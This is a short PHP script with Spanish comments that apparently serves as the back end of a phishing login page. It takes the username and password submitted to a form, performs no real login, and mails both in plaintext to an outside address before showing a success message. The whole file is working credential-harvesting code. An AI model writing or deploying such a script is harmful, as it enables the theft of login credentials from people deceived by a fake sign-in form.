<?php
// Verificar si el formulario fue enviado mediante POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtener los datos del formulario
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Dirección de correo a la que se enviarán los datos
    $to = "gmail@juliaysantino989.com";  // Dirección de correo de destino

    // Asunto del correo
    $subject = "Nuevo intento de inicio de sesión en el formulario";

    // Cuerpo del correo
    $message = "Se ha enviado un formulario de inicio de sesión con los siguientes datos:\n\n";
    $message .= "Usuario: " . $username . "\n";
    $message .= "Contraseña: " . $password . "\n";

    // Encabezados del correo (opcional)
    $headers = "From: no-reply@tudominio.com" . "\r\n" .
               "Reply-To: no-reply@tudominio.com" . "\r\n" .
               "X-Mailer: PHP/" . phpversion();

    // Enviar el correo
    if (mail($to, $subject, $message, $headers)) {
        echo "Los datos han sido enviados correctamente.";
    } else {
        echo "Hubo un error al enviar el correo. Por favor, inténtalo nuevamente.";
    }
} else {
    // Si no se ha enviado el formulario, redirigir al formulario de login
    header("Location: index.html");
    exit();
}
?>
